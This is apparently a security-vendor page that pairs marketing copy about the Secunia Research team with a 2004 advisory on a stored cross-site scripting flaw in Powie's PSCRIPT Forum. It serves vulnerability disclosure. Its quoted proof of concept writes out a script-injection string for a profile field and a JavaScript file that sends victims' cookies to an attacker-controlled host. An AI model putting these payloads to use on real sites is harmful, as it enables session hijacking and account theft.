How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## Powie's PSCRIPT Forum fails to filter user posts

#### Vulnerability Note VU#674542

Original Release Date: 2004-08-23 | Last Revised: 2004-08-25

---

### Overview

Powie's PSCRIPT Forum fails to properly sanitize user input, which allows an attacker to create a user profile that can execute arbitrary scripts in a victim's web browser when the victim views the profile.

### Description

| [Powie's PSCRIPT Forum](http://www.pscript.de/forum/index.php) is an online forum application written in PHP. The application allows users to set up a user profile which may be viewed by other users. A failure to filter input in two fields of the user profile section may permit a malicious user to post HTML/script that will be interpreted by a victim's client. |
| --- |

### Impact

| A malicious user can execute arbitrary HTML/script in the context of the vulnerable web site. If this vulnerability is exploited, a user may be tricked into exposing sensitive information, allowing an attacker to gather information such as passwords and credit card numbers. Information stored in cookies may also be stolen or corrupted. |
| --- |

### Solution

| This issue is resolved in version 1.26 of the forum, available from the [pscript.de download page](http://www.pscript.de/link/index.php?showcat=1). |

Introduction
+----------+
pforum is a BBS, similar to phpBB or other. The author provides
users possibility to enrich their profiles with personal data. Although
the author tries to eliminate malicious code (like unwanted html code)
in the inputs, two of the fields are not handled secure. Therefore it's
possible to steal cookies or do other nasty things.

More Details
+----------+
If you login into your account, pforum saves your user id, your password
and the PHP session id. If somebody redirects you, for example using
javascript, he can append all this data as a query string to the target
URL. Then he can easily using your PHP session id for hijacking your
pforum session. If he creates or modifies two cookies with the user id
or the crypted password, he can easily hijack your account only by visiting
the pforum.

Proof of Concept
+--------------+
Create a Javascript file and save it as bad.js (your domain name is in this
case example.org). The file contains the following code:

// bad.js
function b()
{
    location.href='example.org/compute_stolen_data.ext?'+document.cookie;
}

Edit your profile and enter the following line into the the IRC Server or AIM
ID Input Box. The string have to be shorter then 100 characters.

// Input Box (without line break)
"><script src=<http://example.org/bad.js>></script>
<img height=0 width=0 src=foo onerror=b(); >

Post a lot. Because the picture can't be found and the onError Event Handler
catches this, every user with activated javascript will be automagically
redirected to <http://example.org/compute_stolen_data.ext>. All cookie values
will be appended to the URL.
